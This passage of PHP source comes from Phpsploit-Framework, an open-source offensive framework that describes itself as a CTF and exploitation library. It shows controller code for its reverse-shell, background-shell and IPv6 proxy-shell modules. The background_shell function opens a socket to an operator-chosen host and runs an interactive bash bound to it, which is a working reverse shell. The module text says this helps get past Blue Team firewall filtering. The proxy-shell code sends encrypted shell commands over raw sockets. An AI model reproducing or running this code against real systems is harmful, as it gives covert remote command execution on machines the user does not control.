            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This is a client shell environment based on TCP protocol connection (connected to the server through rebound mode, supporting single person working mode. During CTF matches, it can be used to break through the filtering and interception of data communication by the Blue Team firewall), using temporarily issued communication tokens for communication authentication. When you use the (reverse shell) mode to send shell environment commands, You need to carry a temporary token every time the command is sent For security reasons, when you want to use your specific encapsulated custom server, the temporary token sent along with the command can play a certain authentication role. This is mainly to prevent third-party applications from intervening in the protocol layer and impersonating your identity to send command information to the client. Of course, this setting may bring some inconvenience to your operation, such as when sending a command every time, you need to Use this format: ' . Class_Base_Format ::htmlentities ( "<token> <shell command>" ) . '). In order to be compatible with the usage habits of most moral hackers, in addition to this (reverse shell) mode, the Phpsploit Framework software also provides a (background_shell) background mode to achieve the traditional rebound connection shell environment.Please note that all tokens published in this instance (reverse_shell) are only valid in the client shell environment created in that instance. When the Client Shell environment shuts down and restarts, a new communication token will be generated, and the old communication token will become invalid! If you want to stop this instance of the client shell environment, you need to send the "exit" command to the client of the shell environment to end the current instance of the shell environment running on the client. Warning! When you start a client shell environment instance in the web interface, other functions in the current web environment will become unavailable! If the target host of your current penetration testing or security audit behavior is still running other businesses, you should never use this feature in a web environment, as it will make other businesses in the web environment unusable! The functionality of this module is currently only applicable to web environments without other business operations, as well as relatively independent command-line environments!</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/reverse_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => $_form_listen_ip ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => $_form_listen_port ,
                    ) ,
                    array (
                        "id"       => "max_connect_number" ,
                        "title"    => "( Max Connect Number ) : " ,
                        "describe" => "Max Connect Number" ,
                        "name"     => "max_connect_number" ,
                        "value"    => $_max_connect_number ,
                    ) ,
                    array (
                        "id"       => "max_execute_time" ,
                        "title"    => "( Max Execute Time ) : " ,
                        "describe" => "Max Execute Time" ,
                        "name"     => "max_execute_time" ,
                        "value"    => $_max_execute_time ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Client Shell Environment Connection To Server )" ,
                    "name"  => "submit_form" ,
                    "value" => "connection to server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Client Shell Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Client Shell Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) && ( is_integer ( $_max_connect_number ) ) && ( ( $_max_connect_number <= 10 ) ) && ( is_integer ( $_max_execute_time ) ) && ( $_max_execute_time >= 0 ) && ( is_string ( $_connect_domain_List_id ) ) ) {
            Class_Operate_SocketShell ::start ( $_listen_ip , $_listen_port , $_max_connect_number , $_max_execute_time , $_connect_domain_List_id );
        }
        return null;
    }

    public static function background_shell ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip            = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port          = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_md5_token            = Class_Base_Request ::form ( "md5_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) );
        $_listen_ip            = str_replace ( "\r\n" , "" , $_listen_ip );
        $_socket               = null;
        $_errno                = 0;
        $_errstr               = "";
        $_function_call_info_1 = null;
        $_function_call_info_2 = null;

        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) ) {
            $sock = fsockopen ( $_listen_ip , $_listen_port , $_errno , $_errstr );
            if ( ( ! empty( $sock ) ) && ( $_errno == 0 ) && ( $_errstr == "" ) ) {
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( "\nexec php code : " . ( '$socket = fsockopen ( "' . $_listen_ip . '" , ' . $_listen_port . ' ) ; ' . chr ( 32 ) . 'exec ( "/bin/bash -i <&5 >&5 2>&5" ) ; ' ) . "\n" );
                }
                if ( ! is_cli () ) {
                    $_exec_result = exec ( "/bin/bash -i <&4 >&4 2>&4" , $_output );
                } else {
                    $_exec_result = exec ( "/bin/bash -i <&5 >&5 2>&5" , $_output );
                }
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( array ( "exec_result" => array ( $_output , $_exec_result ) ) );
                }
            } else {
                if ( is_cli () ) {
                    Class_Base_Response ::outputln ( "The creation of a rebound connection to port {$_listen_ip}:{$_listen_port} failed with failure code {$_errno} and prompt {$_errstr}" );
                }
            }
        }
        $_listen_ip              = ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) );
        $_listen_port            = ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) );
        $_cli_url                = Class_Base_Response ::get_cli_url ( "/shell/background_shell" , array ( "start" => 1 , "ip" => $_listen_ip , "port" => $_listen_port , ) );
        $_cli_encode_url         = Class_Base_Response ::get_encode_cli_url ( $_cli_url );
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Establish a connection channel environment based on backend shell</div>';
            $_form_top    .= '<div style="width:100%;word-break:break-all;margin-top:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">The current module (background_shell) is used to establish a reverse shell environment network connection channel from the client to the server. Once the channel is successfully established, the client will become the reverse shell environment of the server (until the server actively disconnects using the exit command). Note: Due to access permissions and the unique nature of the web environment, the current background_ Shell modules may not execute correctly in a web environment. A more effective method is to use CLI mode (command line mode) to run background_ Shell module.</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/background_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => $_listen_ip ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => $_listen_port ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) . ( ( empty( $_listen_ip ) || empty( $_listen_port ) ) ? ( "" ) : ( "\n\n" . '$socket = fsockopen ( "' . $_listen_ip . '" , ' . $_listen_port . ' ) ; ' . "\n\n" . '          exec ( "/bin/sh -i <&4 >&4 2>&4" ) ; ' . "\n\n" . ( ( ( ( $_errno != 0 ) || ( $_errstr != "" ) ) ) ? "The creation of a rebound connection to port {$_listen_ip}:{$_listen_port} failed with failure code {$_errno} and prompt {$_errstr}" : '' ) ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Connect To Server )" ,
                    "name"  => "submit_form" ,
                    "value" => "start connection to server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Connection Client Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Connection Client Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-6-14
 * Time: 下午1:43
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_ProxyShell
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_ProxyShell_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function create_session_id ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_local_ipv6_address = Class_Base_RawSocket ::get_local_ipv6_address ();
        $_src_ipv6_address   = Class_Base_Request ::form ( "src_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_dst_ipv6_address   = Class_Base_Request ::form ( "dst_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        if ( empty( $_src_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) {
                $_src_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ];
            } else {
                $_src_ipv6_address = $_local_ipv6_address;
            }
        }
        if ( empty( $_proxy_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) {
                $_proxy_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ];
            } else {
                $_proxy_ipv6_address = $_local_ipv6_address;
            }
        }
        if ( empty( $_dst_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) {
                $_dst_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ];
            } else {
                $_dst_ipv6_address = $_local_ipv6_address;
            }
        }

        Class_Operate_ProxyShell ::init_session_ipv6_address_info ( $_src_ipv6_address , $_proxy_ipv6_address , $_dst_ipv6_address );

        if ( ( ( is_string ( $_src_ipv6_address ) ) && ( strlen ( $_src_ipv6_address ) > 0 ) ) && ( ( is_string ( $_dst_ipv6_address ) ) && ( strlen ( $_dst_ipv6_address ) > 0 ) ) ) {
            $_session_id = Class_Operate_ProxyShell ::create_authentication_code ( $_src_ipv6_address , $_dst_ipv6_address );
        }
        if ( is_cli () ) {
            if ( ( ! empty( $_src_ipv6_address ) ) && ( ! empty( $_session_id ) ) ) {
                Class_Base_Response ::outputln ( "source ipv6 address ( " . $_src_ipv6_address . " ) , Source Authentication Code : Session ID ( " . $_session_id . " ) " );
            }
            return null;
        }
        $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/proxy_shell/create_session_id" , array ( "src_ipv6" => $_src_ipv6_address , "dst_ipv6" => $_dst_ipv6_address ) );
        $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_show_result    = ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" );
        $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Create Source To Destination Session ID</div>';
        $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to create specified authentication information on the server, This authentication information is mainly used for effective authentication of secure communication between clients and servers The authentication information is calculated and synthesized using the client IPV6 address and the server IPV6 address. Incorrect authentication information will result in authentication failure during the communication process between the client and the server. The authentication code will be automatically created every time the server officially starts the listening instance. When the client sends communication data to the server, it must carry the correct authentication code! To improve communication security, the data sent by the client to the server will After encryption processing, the key information required for the encryption operation is also automatically issued every time the server officially starts the listening instance. Note that the lifecycle of the authentication code and encryption key is the same as the lifecycle of the server listening instance that is started each time! To avoid communication security risks, you should avoid using this PROXY SHELL function in an insecure local area network environment.</span></div>';
        $_form           = array (
            "action"    => "/shell/proxy_shell/create_session_id" ,
            "inputs"    => array (
                array (
                    "id"       => "src_ipv6" ,
                    "title"    => "( Source IPV6 ) : " ,
                    "describe" => "Source IP Address" ,
                    "name"     => "src_ipv6" ,
                    "value"    => ( ( ! empty( $_src_ipv6_address ) ) ? ( $_src_ipv6_address ) : ( $_local_ipv6_address ) ) ,
                ) ,
                array (
                    "id"       => "dst_ipv6" ,
                    "title"    => "( Destination IPV6 ) : " ,
                    "describe" => "Destination IP Address" ,
                    "name"     => "dst_ipv6" ,
                    "value"    => ( ( ! empty( $_dst_ipv6_address ) ) ? ( $_dst_ipv6_address ) : ( $_local_ipv6_address ) ) ,
                ) ,
                array (
                    "id"       => "src_authentication_code" ,
                    "title"    => "( Source Auth Code ) : " ,
                    "describe" => "Source Authentication Code" ,
                    "name"     => "src_authentication_code" ,
                    "value"    => ( ( ! empty( $_session_id ) ) ? ( $_session_id ) : ( '' ) ) ,
                    "disabled" => "disabled" ,
                ) ,
            ) ,
            "textareas" => array (
                array (
                    "id"       => "show_result" ,
                    "title"    => "( Show Result ) : " ,
                    "describe" => "Show Result" ,
                    "name"     => "show_result" ,
                    "value"    => ( ( ! empty( $_show_result ) ) ? ( $_show_result ) : ( '' ) ) ,
                    "disabled" => "disabled" ,
                    "style"    => 'height:300px;' ,
                ) ,
            ) ,
        );
        $_top            = Class_View_Top ::top ();
        $_body           = array (
            "menu"    => Class_View_ProxyShell_Menu ::menu ( array () ) ,
            "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
        );
        $_bottom_menu    = array (
            array (
                "title"    => "" ,
                "describe" => "" ,
                "href"     => "#" ,
            ) ,
        );
        $_content        = '<div></div>';
        $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
        $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
        Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
    }

    public static function clear_session_id ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_local_ipv6_address = Class_Base_RawSocket ::get_local_ipv6_address ();
        $_src_ipv6_address   = Class_Base_Request ::form ( "src_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_dst_ipv6_address   = Class_Base_Request ::form ( "dst_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        if ( ( ( is_string ( $_src_ipv6_address ) ) && ( strlen ( $_src_ipv6_address ) > 0 ) ) && ( Class_Base_Format ::is_ipv6_address ( $_src_ipv6_address ) ) && ( ( is_string ( $_dst_ipv6_address ) ) && ( strlen ( $_dst_ipv6_address ) > 0 ) && ( Class_Base_Format ::is_ipv6_address ( $_dst_ipv6_address ) ) ) ) {
            $_session_id = Class_Operate_ProxyShell ::create_src_to_dst_session_id_string ( $_src_ipv6_address , $_dst_ipv6_address );
        }
        $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/proxy_shell/clear_session_id" , array ( "src_ipv6" => $_src_ipv6_address , "dst_ipv6" => $_dst_ipv6_address ) );
        $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_show_result    = ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" );
        if ( ( ! empty( $_src_ipv6_address ) ) && ( ! empty( $_dst_ipv6_address ) ) && ( ! empty( $_session_id ) ) ) {
            $_deleted = Class_Operate_ProxyShell ::clear_authentication_code ( $_src_ipv6_address );
            if ( $_deleted === false ) {
                $_show_result .= ( "Failed to clear proxy session authorization ID , session_id : " . print_r ( $_session_id , true ) );
            } else {
                $_show_result .= ( "Successfully cleared proxy session authorization ID , session_id : " . print_r ( $_session_id , true ) );
            }
        }
        if ( is_cli () ) {
            if ( ( ! empty( $_src_ipv6_address ) ) && ( ! empty( $_session_id ) ) ) {
                Class_Base_Response ::outputln ( "source ipv6 address ( " . $_src_ipv6_address . " ) , Source Authentication Code : Session ID ( " . $_session_id . " ) " );
            }
            if ( ! empty( $_show_result ) ) {
                Class_Base_Response ::outputln ( "\n" . ( $_show_result ) . "\n" );
            }
            return null;
        }
        $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Clear Source To Destination Session ID</div>';
        $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is mainly used to clear the specified authentication information you previously created on the server. After the authentication information is cleared, clients using this authentication information will not be able to communicate normally with the PROXY SHELL module function on the server (due to the clearing of the authentication information, communication requests sent by the client will be rejected by the server).</span></div>';
        $_form        = array (
            "action"    => "/shell/proxy_shell/clear_session_id" ,
            "inputs"    => array (
                array (
                    "id"       => "src_ipv6" ,
                    "title"    => "( Source IPV6 ) : " ,
                    "describe" => "Source IP Address" ,
                    "name"     => "src_ipv6" ,
                    "value"    => ( ( ! empty( $_src_ipv6_address ) ) ? ( $_src_ipv6_address ) : ( $_local_ipv6_address ) ) ,
                ) ,
                array (
                    "id"       => "dst_ipv6" ,
                    "title"    => "( Destination IPV6 ) : " ,
                    "describe" => "Destination IP Address" ,
                    "name"     => "dst_ipv6" ,
                    "value"    => ( ( ! empty( $_dst_ipv6_address ) ) ? ( $_dst_ipv6_address ) : ( $_local_ipv6_address ) ) ,
                ) ,
                array (
                    "id"       => "src_authentication_code" ,
                    "title"    => "( Source Auth Code ) : " ,
                    "describe" => "Source Authentication Code" ,
                    "name"     => "src_authentication_code" ,
                    "value"    => ( ( ! empty( $_session_id ) ) ? ( $_session_id ) : ( '' ) ) ,
                    "disabled" => "disabled" ,
                ) ,
            ) ,
            "textareas" => array (
                array (
                    "id"       => "show_result" ,
                    "title"    => "( Show Result ) : " ,
                    "describe" => "Show Result" ,
                    "name"     => "show_result" ,
                    "value"    => ( ( ! empty( $_show_result ) ) ? ( $_show_result ) : ( '' ) ) ,
                    "disabled" => "disabled" ,
                    "style"    => "height:300px;" ,
                ) ,
            ) ,
        );
        $_top         = Class_View_Top ::top ();
        $_body        = array (
            "menu"    => Class_View_ProxyShell_Menu ::menu ( array () ) ,
            "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
        );
        $_bottom_menu = array (
            array (
                "title"    => "" ,
                "describe" => "" ,
                "href"     => "#" ,
            ) ,
        );
        $_content     = '<div></div>';
        $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
        $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
        Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
    }

    public static function send ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();

        $_debug              = Class_Base_Request ::form ( "debug" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_local_ipv6_address = Class_Base_RawSocket ::get_local_ipv6_address ();
        $_src_ipv6_address   = Class_Base_Request ::form ( "src_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_proxy_ipv6_address = Class_Base_Request ::form ( "proxy_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_dst_ipv6_address   = Class_Base_Request ::form ( "dst_ipv6" , Class_Base_Request::TYPE_STRING , "" );
        $_md5_token          = Class_Base_Request ::form ( "md5_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) );
        $_command            = Class_Base_Request ::form ( "command" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_key         = Class_Base_Request ::form ( "encode_key" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_iv_base64   = Class_Base_Request ::form ( "encode_iv_base64" , Class_Base_Request::TYPE_STRING , "" );
        if ( empty( $_src_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ] ) ) {
                $_src_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_SRC_IPV6" ];
            } else {
                $_src_ipv6_address = $_local_ipv6_address;
            }
        }
        if ( empty( $_proxy_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ] ) ) {
                $_proxy_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_PROXY_IPV6" ];
            } else {
                $_proxy_ipv6_address = $_local_ipv6_address;
            }
        }
        if ( empty( $_dst_ipv6_address ) ) {
            if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ] ) ) {
                $_dst_ipv6_address = $_SESSION[ "PHPSPLOIT_FRAMEWORK_PROXY_SHELL_DST_IPV6" ];
            } else {
                $_dst_ipv6_address = $_local_ipv6_address;
            }
        }
        Class_Operate_ProxyShell ::init_session_ipv6_address_info ( $_src_ipv6_address , $_proxy_ipv6_address , $_dst_ipv6_address );
        if ( ( ( is_string ( $_src_ipv6_address ) ) && ( strlen ( $_src_ipv6_address ) > 0 ) ) && ( ( is_string ( $_dst_ipv6_address ) ) && ( strlen ( $_dst_ipv6_address ) > 0 ) ) ) {
            $_session_id = Class_Operate_ProxyShell ::create_authentication_code ( $_src_ipv6_address , $_dst_ipv6_address );
        }
        if ( ! is_cli () ) {
            $_send_request_result_id = "send_request_result_id";
            $_cli_url                = Class_Base_Response ::get_cli_url ( "/shell/proxy_shell/send" , array ( "src_ipv6" => $_src_ipv6_address , "proxy_ipv6" => $_proxy_ipv6_address , "dst_ipv6" => $_dst_ipv6_address , "session_id" => $_session_id , "command" => $_command , "encode_key" => $_encode_key , "encode_iv_base64" => $_encode_iv_base64 , "debug" => $_debug ) );
            $_cli_encode_url         = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top               = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Send Command To Proxy Shell Server</div>';
            $_form_top               .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module uses raw socket technology to send shell command information from the client side of the PROXY SHELL environment to the server side. Currently, the SEND module cannot receive corresponding return information from the server side (because in the IPV6 protocol of the network layer, there are no transport level related functions, such as transmission level features based on serial numbers, flags, retransmissions, timeouts, etc.). In the module components of this PROXY SHELL series kit, there is a dedicated RECIVE module function to receive return information sent from the server of the PROXY SHELL environment to the client.</span></div>';
            $_form                   = array (
                "action"    => "/shell/proxy_shell/send" ,
                "inputs"    => array (
                    array (
                        "id"       => "src_ipv6" ,
                        "title"    => "( Source IPV6 ) : " ,
                        "describe" => "Source IP Address" ,
                        "name"     => "src_ipv6" ,
                        "value"    => ( ( ! empty( $_src_ipv6_address ) ) ? ( $_src_ipv6_address ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "proxy_ipv6" ,
                        "title"    => "( Proxy IPV6 ) : " ,
                        "describe" => "Proxy IP Address" ,
                        "name"     => "proxy_ipv6" ,
                        "value"    => ( ( ! empty( $_proxy_ipv6_address ) ) ? ( $_proxy_ipv6_address ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "dst_ipv6" ,
                        "title"    => "( Destination IPV6 ) : " ,
                        "describe" => "Destination IP Address" ,
                        "name"     => "dst_ipv6" ,
                        "value"    => ( ( ! empty( $_dst_ipv6_address ) ) ? ( $_dst_ipv6_address ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "session_id" ,
                        "title"    => "( Auth Session ID ) : " ,
                        "describe" => "Auth Session ID" ,
                        "name"     => "session_id" ,
                        "value"    => ( ( ! empty( $_session_id ) ) ? ( $_session_id ) : ( '' ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "encode_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "Encode Key" ,
                        "name"     => "encode_key" ,
                        "value"    => ( ( ! empty( $_encode_key ) ) ? ( $_encode_key ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_iv_base64" ,
                        "title"    => "( Encode IV Base64 ) : " ,
                        "describe" => "Encode IV Base64" ,
                        "name"     => "encode_iv_base64" ,
